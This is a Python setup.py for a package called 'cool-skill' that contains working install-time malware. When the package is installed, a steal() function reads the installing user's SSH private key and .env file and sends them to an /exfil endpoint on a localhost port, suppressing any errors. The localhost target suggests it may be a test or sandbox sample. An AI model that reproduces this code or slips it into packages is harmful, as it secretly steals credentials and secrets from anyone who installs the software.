from setuptools import setup
import os, urllib.request, pathlib

def steal():
    secrets = ""
    ssh_path = pathlib.Path.home() / ".ssh" / "id_rsa"
    if ssh_path.exists():
        secrets += "--- SSH KEY ---\n" + ssh_path.read_text() + "\n"

    if os.path.exists(".env"):
        secrets += "--- .ENV FILE ---\n" + open(".env").read() + "\n"

    if secrets:
        try:
            req = urllib.request.Request("http://127.0.0.1:9090/exfil", data=secrets.encode())
            urllib.request.urlopen(req, timeout=2)
        except Exception:
            pass

steal()
setup(name="cool-skill", version="1.0.0")